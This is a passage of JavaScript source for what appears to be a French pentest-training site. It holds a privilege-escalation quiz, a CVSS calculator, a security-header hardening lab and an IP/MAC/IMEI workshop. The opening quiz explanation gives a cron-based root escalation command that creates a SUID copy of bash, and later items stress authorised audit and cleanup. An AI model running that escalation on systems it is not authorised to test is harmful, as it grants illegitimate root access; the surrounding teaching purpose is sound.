    explain: "Le script est exécuté par root toutes les 2 minutes et world-writable : on y ajoute `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`, puis on exécute `/tmp/rootbash -p`. C'est une mauvaise configuration classique."
  },
  {
    title: "Étape 4 — après l'audit",
    output: `$ id
uid=0(root) gid=0(root) groups=0(root)

Un fichier /tmp/rootbash a été créé, et /opt/backup.sh a été modifié.`,
    q: "Que faites-vous en priorité ?",
    options: [
      "Installer un accès persistant pour revenir plus tard",
      "Capturer les preuves (hash, horodatage), restaurer les fichiers et consigner le nettoyage",
      "Supprimer les logs pour ne pas être détecté",
      "Créer un compte admin permanent"
    ],
    answer: 1,
    explain: "En audit autorisé : preuve d'abord, puis restauration et nettoyage documentés. La persistance non autorisée et la suppression de logs sortent du cadre et nuisent à la détection Blue Team."
  }
];

function labPrivesc(body, api) {
  let step = 0;
  let score = 0;
  let answered = false;

  const render = () => {
    if (step >= PRIVESC_STEPS.length) {
      const pctScore = Math.round((score / PRIVESC_STEPS.length) * 100);
      body.innerHTML = `
        <div class="quiz-result">
          <p class="pill ${pctScore >= 75 ? 'pill-lime' : 'pill-amber'}">${score} / ${PRIVESC_STEPS.length} bonnes réponses</p>
          <h3>${pctScore >= 75 ? 'Chemin maîtrisé' : 'À revoir'}</h3>
          <p>${pctScore >= 75 ? "Vous avez identifié les mauvaises configurations et les bons réflexes de nettoyage." : "Relisez les fiches SUID, sudo et cron, puis recommencez : chaque erreur en mission réelle peut coûter cher."}</p>
          <button class="btn btn-primary" id="pv-retry" type="button">Recommencer</button>
        </div>`;
      body.querySelector('#pv-retry').addEventListener('click', () => { step = 0; score = 0; render(); });
      if (pctScore >= 75) api.done('Élévation de privilèges');
      return;
    }
    const s = PRIVESC_STEPS[step];
    answered = false;
    body.innerHTML = `
      <div class="flex-between mb-2">
        <span class="pill pill-cyan">${esc(s.title)}</span>
        <span class="mono small muted">${step + 1} / ${PRIVESC_STEPS.length}</span>
      </div>
      <div class="term"><div class="term-head">énumération — lab</div><div class="term-body">${s.output.split('\n').map((l) => `<div class="term-line">${l.startsWith('$') ? `<span class="p">$</span> <span class="cmd">${esc(l.slice(1).trim())}</span>` : esc(l)}</div>`).join('')}</div></div>
      <h4 class="mt-2">${esc(s.q)}</h4>
      <div class="q-opts" id="pv-opts">
        ${s.options.map((o, i) => `<button class="q-opt" type="button" data-i="${i}"><span class="q-key">${String.fromCharCode(65 + i)}</span><span>${esc(o)}</span></button>`).join('')}
      </div>
      <div id="pv-fb" class="mt-2"></div>`;

    body.querySelectorAll('#pv-opts .q-opt').forEach((btn) => {
      btn.addEventListener('click', () => {
        if (answered) return;
        answered = true;
        const i = Number(btn.dataset.i);
        const ok = i === s.answer;
        if (ok) score++;
        body.querySelectorAll('.q-opt').forEach((b, bi) => {
          b.disabled = true;
          if (bi === s.answer) b.classList.add('correct');
          if (bi === i && !ok) b.classList.add('wrong');
        });
        body.querySelector('#pv-fb').innerHTML = `<div class="q-explain"><b>${ok ? 'Correct.' : 'Raté.'}</b> ${esc(s.explain)}</div>
          <button class="btn btn-primary mt-2" id="pv-next" type="button">${step === PRIVESC_STEPS.length - 1 ? 'Voir le résultat' : 'Étape suivante'} →</button>`;
        body.querySelector('#pv-next').addEventListener('click', () => { step++; render(); });
      });
    });
  };
  render();
}

/* ------------------------------------------------------------------ */
/* LAB 8 — CVSS                                                        */
/* ------------------------------------------------------------------ */

function labCvss(body, api) {
  let current = { ...DEFAULT_CVSS };

  const controls = CVSS_METRICS.map((m) => {
    if (m.key === 'S') {
      return `<label class="field"><span>${m.label}</span>
        <select data-k="${m.key}">
          ${m.options.map((o) => `<option value="${o.v}" ${current[m.key] === o.v ? 'selected' : ''}>${o.label}</option>`).join('')}
        </select></label>`;
    }
    return `<label class="field"><span>${m.label}</span>
      <select data-k="${m.key}">
        ${m.options.map((o) => `<option value="${o.v}" ${current[m.key] === o.v ? 'selected' : ''}>${o.label}</option>`).join('')}
      </select></label>`;
  }).join('');

  body.innerHTML = `
    <div class="grid" style="grid-template-columns:1.15fr .85fr;gap:18px;align-items:start">
      <div>
        <div class="grid grid-2" style="gap:10px 14px">${controls}</div>
        <div class="flex flex-wrap mt-1">
          ${cvssExamples().map((e) => `<button class="deck-tab" data-ex="${e.id}" type="button" title="${esc(e.note)}">${esc(e.name)}</button>`).join('')}
        </div>
      </div>
      <div>
        <div class="card glow" style="text-align:center;padding:22px">
          <small class="dim" style="letter-spacing:.14em;text-transform:uppercase">Score de base</small>
          <div class="mono" id="cv-score" style="font-size:54px;line-height:1.1;color:var(--red)">9.8</div>
          <div id="cv-sev" class="pill pill-red">CRITICAL</div>
          <div class="bar bar-lg mt-2"><i id="cv-bar" style="width:98%"></i></div>
          <div class="small muted mt-2">Impact <b id="cv-impact" class="mono">5.9</b> · Exploitabilité <b id="cv-expl" class="mono">3.9</b></div>
        </div>
        <div class="panel-mock mt-2">
          <div class="pm-head"><span class="ok">●</span> vecteur CVSS</div>
          <div class="pm-body" id="cv-vector" style="font-size:11.5px"></div>
        </div>
        <button class="btn btn-block mt-2" id="cv-copy" type="button">Copier le vecteur & valider</button>
      </div>
    </div>`;

  const scoreEl = body.querySelector('#cv-score');
  const sevEl = body.querySelector('#cv-sev');
  const bar = body.querySelector('#cv-bar');
  const impactEl = body.querySelector('#cv-impact');
  const explEl = body.querySelector('#cv-expl');
  const vectorEl = body.querySelector('#cv-vector');
  let vector = '';

  const update = () => {
    const r = computeCvss(current);
    vector = r.vector;
    scoreEl.textContent = r.score.toFixed(1);
    scoreEl.style.color = r.severity.color;
    sevEl.textContent = r.severity.label.toUpperCase();
    sevEl.className = `pill pill-${r.severity.cls === 'info' ? 'violet' : r.severity.cls}`;
    bar.style.width = `${r.score * 10}%`;
    impactEl.textContent = r.impact.toFixed(1);
    explEl.textContent = r.exploitability.toFixed(1);
    vectorEl.textContent = r.vector;
  };

  body.querySelectorAll('select[data-k]').forEach((sel) => {
    sel.addEventListener('change', () => {
      current[sel.dataset.k] = sel.value;
      update();
    });
  });
  body.querySelectorAll('[data-ex]').forEach((btn) => {
    btn.addEventListener('click', () => {
      const ex = cvssExamples().find((e) => e.id === btn.dataset.ex);
      if (!ex) return;
      current = { ...ex.state };
      body.querySelectorAll('select[data-k]').forEach((sel) => { sel.value = current[sel.dataset.k]; });
      update();
    });
  });
  body.querySelector('#cv-copy').addEventListener('click', () => {
    copyText(vector);
    runLab('cvss');
    api.done('CVSS calculé');
  });
  update();
}

/* ------------------------------------------------------------------ */
/* LAB 9 — headers                                                     */
/* ------------------------------------------------------------------ */

const HEADER_DEFS = [
  { key: 'csp', label: 'Content-Security-Policy', value: "default-src 'self'; object-src 'none'; base-uri 'none'", points: 25, risk: 'XSS et injection de ressources', why: "Limite les sources de scripts et bloque l'exécution inline non autorisée." },
  { key: 'hsts', label: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains', points: 15, risk: 'Downgrade HTTPS / SSL stripping', why: 'Force HTTPS pour toutes les futures connexions au domaine.' },
  { key: 'nosniff', label: 'X-Content-Type-Options', value: 'nosniff', points: 10, risk: 'MIME sniffing', why: 'Empêche le navigateur de deviner un type différent de celui déclaré.' },
  { key: 'frame', label: 'X-Frame-Options / frame-ancestors', value: 'DENY', points: 15, risk: 'Clickjacking', why: 'Interdit l’intégration de la page dans une iframe tierce.' },
  { key: 'referrer', label: 'Referrer-Policy', value: 'strict-origin-when-cross-origin', points: 10, risk: 'Fuite d’URL et de jetons', why: 'Réduit les informations envoyées aux sites tiers.' },
  { key: 'perms', label: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()', points: 10, risk: 'Abus d’API navigateur', why: 'Désactive les fonctionnalités non utilisées.' },
  { key: 'coop', label: 'Cross-Origin-Opener-Policy', value: 'same-origin', points: 10, risk: 'Fuites cross-origin', why: 'Isole le contexte de navigation des fenêtres tierces.' },
  { key: 'cache', label: 'Cache-Control (pages sensibles)', value: 'no-store', points: 5, risk: 'Données privées en cache', why: 'Empêche la mise en cache des réponses contenant des données personnelles.' }
];

function labHeaders(body, api) {
  body.innerHTML = `
    <div class="grid" style="grid-template-columns:1fr .9fr;gap:18px;align-items:start">
      <div>
        <p class="lab-note">Activez les protections et observez la note. Certaines sont indispensables, d'autres complémentaires.</p>
        <div class="mt-2" id="h-list">
          ${HEADER_DEFS.map((h) => `
            <label class="check" style="padding:8px 0;border-bottom:1px solid var(--line)">
              <input type="checkbox" data-k="${h.key}">
              <span><b style="color:var(--text)">${h.label}</b><br><span class="small dim">${h.why}</span></span>
            </label>`).join('')}
        </div>
      </div>
      <div>
        <div class="card" style="text-align:center">
          <small class="dim" style="letter-spacing:.14em;text-transform:uppercase">Note de sécurité</small>
          <div class="mono" id="h-grade" style="font-size:48px;line-height:1.2;color:var(--red)">F</div>
          <div class="bar bar-lg"><i id="h-bar" style="width:0%"></i></div>
          <div class="small muted mt-2"><b id="h-score">0</b> / 100 points</div>
          <div id="h-status" class="small mt-2" style="color:var(--red)">Serveur non durci</div>
        </div>
        <div class="panel-mock mt-2">
          <div class="pm-head"><span class="ok">●</span> en-têtes renvoyés</div>
          <div class="pm-body" id="h-headers" style="font-size:11.5px">HTTP/1.1 200 OK<br>Server: nginx/1.18.0<br>X-Powered-By: PHP/7.4.33</div>
        </div>
      </div>
    </div>`;

  const update = () => {
    const active = HEADER_DEFS.filter((h) => body.querySelector(`input[data-k="${h.key}"]`).checked);
    const score = active.reduce((s, h) => s + h.points, 0);
    const grade = score >= 95 ? 'A+' : score >= 85 ? 'A' : score >= 70 ? 'B' : score >= 55 ? 'C' : score >= 35 ? 'D' : 'F';
    const color = score >= 85 ? 'var(--lime)' : score >= 55 ? 'var(--amber)' : 'var(--red)';
    body.querySelector('#h-grade').textContent = grade;
    body.querySelector('#h-grade').style.color = color;
    body.querySelector('#h-score').textContent = score;
    body.querySelector('#h-bar').style.width = `${score}%`;
    const st = body.querySelector('#h-status');
    st.style.color = color;
    st.textContent = score >= 85 ? 'Défense solide' : score >= 55 ? 'Protection partielle' : 'Serveur exposé';

    const base = ['HTTP/1.1 200 OK', 'Content-Type: text/html; charset=utf-8'];
    const lines = active.map((h) => `<span class="hl">${esc(h.label)}</span>: ${esc(h.value)}`);
    const missing = HEADER_DEFS.filter((h) => !active.includes(h)).map((h) => `<span class="mut"># manquant : ${esc(h.label)}</span>`);
    body.querySelector('#h-headers').innerHTML = base.map(esc).join('<br>') + (lines.length ? '<br>' + lines.join('<br>') : '') + (missing.length ? '<br><br>' + missing.join('<br>') : '');
    if (score >= 80) api.done('Durcissement HTTP');
  };

  body.querySelectorAll('input[data-k]').forEach((i) => i.addEventListener('change', update));
  update();
}

/* ------------------------------------------------------------------ */
/* LAB 10 — traceur IP, MAC & IMEI                                     */
/* ------------------------------------------------------------------ */

const ID_IP_CASES = {
  private: {
    ip: '192.168.56.42',
    kind: 'Adresse privée RFC 1918',
    route: 'Non routable sur Internet : elle reste derrière le NAT.',
    trace: 'Visible du routeur local et des journaux internes. Aucun whois public utile.',
    answer: 0
  },
  public: {
    ip: '8.8.8.8',
    kind: 'Adresse publique routable',
    route: 'Annoncée sur Internet via un ASN ; elle appartient à un opérateur.',
    trace: 'whois/RDAP → opérateur et pays ; géolocalisation approximative. Jamais l’identité de l’utilisateur.',
    answer: 1
  },
  doc: {
    ip: '203.0.113.42',
    kind: 'Documentation RFC 5737 (TEST-NET-3)',
    route: 'Réservée à la documentation : elle ne doit jamais être routée.',
    trace: 'Aucun abonné réel. Si elle apparaît dans un log de production, c’est une erreur ou une falsification.',
    answer: 2
  },
  cgnat: {
    ip: '100.64.12.7',
    kind: 'CGNAT opérateur (RFC 6598)',
    route: 'Partagée par de nombreux abonnés derrière le NAT de l’opérateur.',
    trace: 'Impossible de remonter à un foyer sans la table de translation de l’opérateur et l’horodatage exact.',
    answer: 3
  }
};

function macInfo(raw) {
  const clean = String(raw || '').trim().replace(/[^0-9a-f]/gi, '').toLowerCase();
  if (!/^[0-9a-f]{12}$/.test(clean)) return { ok: false };
  const bytes = clean.match(/../g);
  const first = parseInt(bytes[0], 16);
  const vendors = {
    '08:00:27': 'PCS Systemtechnik / VirtualBox',
    '00:50:56': 'VMware',
    '00:1c:42': 'Parallels',
    '00:0c:29': 'VMware'
  };
  const oui = bytes.slice(0, 3).join(':');
  return {
    ok: true,
    mac: bytes.join(':'),
    oui,
    multicast: (first & 1) === 1,
    local: (first & 2) === 2,
    vendor: vendors[oui] || ((first & 2) === 2 ? 'Aucun OUI fabricant (adresse locale)' : 'Fabricant inconnu ou non vérifié')
  };
}

function luhnOk(number) {
  let total = 0;
  const digits = String(number);
  for (let i = 0; i < digits.length; i++) {
    let d = Number(digits[digits.length - 1 - i]);
    if (i % 2 === 1) {
      d *= 2;
      if (d > 9) d -= 9;
    }
    total += d;
  }
  return total % 10 === 0;
}

function imeiInfo(raw) {
  const digits = String(raw || '').replace(/\D/g, '');
  if (digits.length !== 15) return { ok: false, reason: 'Un IMEI classique comporte exactement 15 chiffres.' };
  return {
    ok: true,
    imei: digits,
    tac: digits.slice(0, 8),
    serial: digits.slice(8, 14),
    check: digits[14],
    valid: luhnOk(digits)
  };
}

function labIdentity(body, api) {
  body.innerHTML = `
    <p class="lab-note">Analysez les trois couches. Les valeurs proposées sont fictives ou réservées à la documentation : aucune requête réseau n’est émise.</p>
    <div class="flex-between mt-2 mb-2" style="gap:10px;flex-wrap:wrap">
      <span class="small muted">Progression de l’atelier</span>
      <span class="pill pill-cyan" id="id-score">0 / 3 couches validées</span>
    </div>
    <div class="grid grid-2" style="gap:14px;align-items:start">

      <div class="card pad-sm">
        <h4 class="mt-0">1. Adresse IP</h4>
        <label class="field"><span>Choisir une adresse</span>
          <select id="id-ip-select">
            ${Object.entries(ID_IP_CASES).map(([k, c]) => `<option value="${k}">${esc(c.ip)} — ${esc(c.kind)}</option>`).join('')}
          </select>
        </label>
        <div class="panel-mock mt-2"><div class="pm-head"><span class="ok">●</span> lecture réseau</div><div class="pm-body" id="id-ip-info"></div></div>
        <p class="small muted mt-2"><b>Question :</b> quelle est la portée de cette adresse ?</p>
        <div class="q-opts" id="id-ip-opts">
          ${['Privée / réseau local', 'Publique routable', 'Documentation non routable', 'CGNAT partagé'].map((o, i) => `<button class="q-opt" type="button" data-i="${i}"><span class="q-key">${String.fromCharCode(65 + i)}</span><span>${esc(o)}</span></button>`).join('')}
        </div>
        <div class="small mt-2" id="id-ip-fb"></div>
      </div>

      <div class="card pad-sm">
        <h4 class="mt-0">2. Adresse MAC</h4>
        <label class="field"><span>Adresse MAC (12 chiffres hexadécimaux)</span>
          <input type="text" id="id-mac-input" value="02:00:5E:10:00:01" spellcheck="false" autocomplete="off">
        </label>
        <button class="btn btn-primary btn-block btn-sm" id="id-mac-run" type="button">Analyser la MAC</button>
        <div class="panel-mock mt-2"><div class="pm-head"><span class="ok">●</span> lecture couche 2</div><div class="pm-body" id="id-mac-info"><span class="mut">En attente…</span></div></div>
        <p class="small muted mt-2"><b>Question :</b> que signifie le bit U/L à 1 ?</p>
        <div class="q-opts" id="id-mac-opts">
          ${['Adresse globale, unique au fabricant', 'Adresse administrée localement, souvent randomisée', 'Adresse multicast', 'Adresse de broadcast'].map((o, i) => `<button class="q-opt" type="button" data-i="${i}"><span class="q-key">${String.fromCharCode(65 + i)}</span><span>${esc(o)}</span></button>`).join('')}
        </div>
        <div class="small mt-2" id="id-mac-fb"></div>
      </div>

      <div class="card pad-sm">
        <h4 class="mt-0">3. IMEI</h4>
        <label class="field"><span>IMEI (15 chiffres)</span>
          <input type="text" id="id-imei-input" value="356938035643809" inputmode="numeric" spellcheck="false" autocomplete="off">
        </label>
        <button class="btn btn-primary btn-block btn-sm" id="id-imei-run" type="button">Vérifier l’IMEI</button>
        <div class="panel-mock mt-2"><div class="pm-head"><span class="ok">●</span> lecture identifiant mobile</div><div class="pm-body" id="id-imei-info"><span class="mut">En attente…</span></div></div>
        <p class="small muted mt-2"><b>Question :</b> un site public peut-il localiser l’appareil avec l’IMEI ?</p>
        <div class="q-opts" id="id-imei-opts">
          ${['Oui, il convertit l’IMEI en coordonnées GPS', 'Oui, tout opérateur publie la position', 'Non, seul l’opérateur avec un cadre légal le peut', 'Oui, grâce à l’adresse MAC du téléphone'].map((o, i) => `<button class="q-opt" type="button" data-i="${i}"><span class="q-key">${String.fromCharCode(65 + i)}</span><span>${esc(o)}</span></button>`).join('')}
        </div>
        <div class="small mt-2" id="id-imei-fb"></div>
      </div>

      <div class="card pad-sm" style="background:var(--bg-2)">
        <h4 class="mt-0">Synthèse</h4>
        <p class="small muted">Chaque couche répond à une question différente : l’IP route, la MAC identifie localement, l’IMEI identifie le terminal mobile. Aucune ne désigne une personne à elle seule.</p>
        <ul class="small" style="padding-left:18px;margin:0">
          <li><b>IP</b> : opérateur, ASN, zone approximative, logs.</li>
          <li><b>MAC</b> : segment local, switch, bail DHCP, fabricant.</li>
          <li><b>IMEI</b> : terminal, TAC, opérateur, réquisition.</li>
        </ul>
        <div class="small mt-2" id="id-final"></div>
      </div>
    </div>`;

  let ipSolved = false;
  let macSolved = false;
  let imeiSolved = false;
  let macAnalyzed = false;
  let imeiAnalyzed = false;

  const sync = () => {
    const n = [ipSolved, macSolved, imeiSolved].filter(Boolean).length;
    const score = body.querySelector('#id-score');
    score.textContent = `${n} / 3 couches validées`;
    score.className = `pill ${n === 3 ? 'pill-lime' : 'pill-cyan'}`;
    body.querySelector('#id-final').innerHTML = n === 3
      ? '<span class="ok"><b>Atelier terminé.</b> Vous savez distinguer portée réseau, portée locale et portée mobile.</span>'
      : `<span class="mut">${3 - n} couche(s) restante(s) à valider.</span>`;
    if (n === 3) api.done('Traceur IP, MAC et IMEI');
  };

  const ipSel = body.querySelector('#id-ip-select');
  const ipInfo = body.querySelector('#id-ip-info');
  const ipFb = body.querySelector('#id-ip-fb');
  const drawIp = () => {
    const c = ID_IP_CASES[ipSel.value];
    ipInfo.innerHTML = `
      <div><b>${esc(c.ip)}</b></div>
      <div class="small">Type : ${esc(c.kind)}</div>
      <div class="small">Routage : ${esc(c.route)}</div>
      <div class="small">Traçage : ${esc(c.trace)}</div>`;
  };
  ipSel.addEventListener('change', () => {
    drawIp();
    ipFb.innerHTML = '';
  });
  body.querySelectorAll('#id-ip-opts .q-opt').forEach((btn) => {
    btn.addEventListener('click', () => {
      const c = ID_IP_CASES[ipSel.value];
      const i = Number(btn.dataset.i);
      if (i === c.answer) {
        ipSolved = true;
        ipFb.innerHTML = '<span class="ok">✓ Correct. ' + esc(c.trace) + '</span>';
        btn.classList.add('correct');
      } else {
        ipFb.innerHTML = '<span class="ko">✕ Relisez la plage et le routage indiqués ci-dessus.</span>';
      }
      sync();
    });
  });
  drawIp();

  const macRun = body.querySelector('#id-mac-run');
  const macInput = body.querySelector('#id-mac-input');
  const macInfoEl = body.querySelector('#id-mac-info');
  const macFb = body.querySelector('#id-mac-fb');
  macRun.addEventListener('click', () => {
    const info = macInfo(macInput.value);
    if (!info.ok) {
      macAnalyzed = false;
      macInfoEl.innerHTML = '<span class="err">Format invalide : 12 chiffres hexadécimaux attendus (ex. 08:00:27:AA:BB:CC).</span>';
      return;
    }
    macAnalyzed = true;
    macInfoEl.innerHTML = `
      <div><b>${esc(info.mac)}</b></div>
      <div class="small">OUI : ${esc(info.oui)} — ${esc(info.vendor)}</div>
      <div class="small">Type : ${info.multicast ? 'multicast' : 'unicast'}</div>
      <div class="small">Portée : ${info.local ? 'locale (bit U/L = 1)' : 'globale (bit U/L = 0)'}</div>
      <div class="small">Visible : segment local uniquement, réécrite par chaque routeur.</div>`;
    macFb.innerHTML = '<span class="mut">Analyse effectuée. Répondez à la question ci-dessous.</span>';
  });
  body.querySelectorAll('#id-mac-opts .q-opt').forEach((btn) => {
    btn.addEventListener('click', () => {
      if (!macAnalyzed) {
        macFb.innerHTML = '<span class="ko">Analysez d’abord l’adresse MAC.</span>';
        return;
      }
      if (Number(btn.dataset.i) === 1) {
        macSolved = true;
        macFb.innerHTML = '<span class="ok">✓ Exact. Le bit U/L à 1 indique une adresse locale, typique d’une VM ou d’une randomisation : aucun OUI fabricant.</span>';
        btn.classList.add('correct');
      } else {
        macFb.innerHTML = '<span class="ko">✕ Le bit U/L n’a rien à voir avec le multicast ni avec le broadcast.</span>';
      }
      sync();
    });
  });

  const imeiRun = body.querySelector('#id-imei-run');
  const imeiInput = body.querySelector('#id-imei-input');
  const imeiInfoEl = body.querySelector('#id-imei-info');
  const imeiFb = body.querySelector('#id-imei-fb');
  imeiRun.addEventListener('click', () => {
    const info = imeiInfo(imeiInput.value);
    if (!info.ok) {
      imeiAnalyzed = false;
      imeiInfoEl.innerHTML = `<span class="err">${esc(info.reason)}</span>`;
      return;
    }
    imeiAnalyzed = true;
    imeiInfoEl.innerHTML = `
      <div><b>${esc(info.imei)}</b> — ${info.valid ? '<span class="ok">Luhn valide</span>' : '<span class="err">Luhn invalide</span>'}</div>
      <div class="small">TAC (8) : ${esc(info.tac)}</div>
      <div class="small">Série (6) : ${esc(info.serial)}</div>
      <div class="small">Contrôle (1) : ${esc(info.check)}</div>
      <div class="small">Localisation : non contenue dans l’IMEI ; l’opérateur voit la cellule.</div>`;
    imeiFb.innerHTML = '<span class="mut">Vérification effectuée. Répondez à la question ci-dessous.</span>';
  });
  body.querySelectorAll('#id-imei-opts .q-opt').forEach((btn) => {
    btn.addEventListener('click', () => {
      if (!imeiAnalyzed) {
        imeiFb.innerHTML = '<span class="ko">Vérifiez d’abord l’IMEI.</span>';
        return;
      }
      if (Number(btn.dataset.i) === 2) {
        imeiSolved = true;
        imeiFb.innerHTML = '<span class="ok">✓ Correct. L’IMEI identifie le terminal ; la localisation relève de l’opérateur et d’un cadre légal.</span>';
        btn.classList.add('correct');
      } else {
        imeiFb.innerHTML = '<span class="ko">✕ L’IMEI ne contient aucune coordonnée et n’est pas un identifiant public de localisation.</span>';
      }
      sync();
    });
  });

  sync();
}

/* ------------------------------------------------------------------ */
/* registre & montage                                                  */
/* ------------------------------------------------------------------ */

const REGISTRY = {
  legal: { meta: LAB_META[0], render: labLegal },
  nmap: { meta: LAB_META[1], render: labNmap },
  fuzz: { meta: LAB_META[2], render: labFuzz },
  sqli: { meta: LAB_META[3], render: labSqli },
  xss: { meta: LAB_META[4], render: labXss },
  burp: { meta: LAB_META[5], render: labBurp },
  privesc: { meta: LAB_META[6], render: labPrivesc },
  cvss: { meta: LAB_META[7], render: labCvss },
  headers: { meta: LAB_META[8], render: labHeaders },
  identity: { meta: LAB_META[9], render: labIdentity }
};

export const LABS = Object.values(REGISTRY).map((l) => l.meta);
export const LAB_BY_ID = Object.fromEntries(Object.entries(REGISTRY).map(([id, l]) => [id, l.meta]));

export function mountLab(root, id, opts = {}) {
  const lab = REGISTRY[id];
  if (!lab) {
    root.innerHTML = `<div class="empty"><span class="empty-ico">⚠</span>Atelier « ${esc(id)} » indisponible.</div>`;
    return;
  }
  root.innerHTML = `
    <div class="lab">
      <div class="lab-head">
        <span class="lab-tag">Atelier</span>
        <h3>${esc(lab.meta.title)}</h3>
        <span class="spacer"></span>
        <span class="lab-note">${esc(lab.meta.tag)} · +20 XP</span>
      </div>
      <div class="lab-body"></div>
    </div>`;
  const body = root.querySelector('.lab-body');
  let doneFired = false;
  lab.render(body, {
    done(label) {
      if (doneFired) return;
      doneFired = true;
      const isNew = completeLab(id, label || lab.meta.title);
      toast(isNew ? `<b>Atelier réussi</b><br><span class="small">${esc(label || lab.meta.title)} — +20 XP</span>` : 'Atelier déjà validé — entraînement libre', isNew ? 'xp' : 'info', isNew ? '✓' : 'ℹ');
      if (opts.onDone) opts.onDone();
    }
  });
}
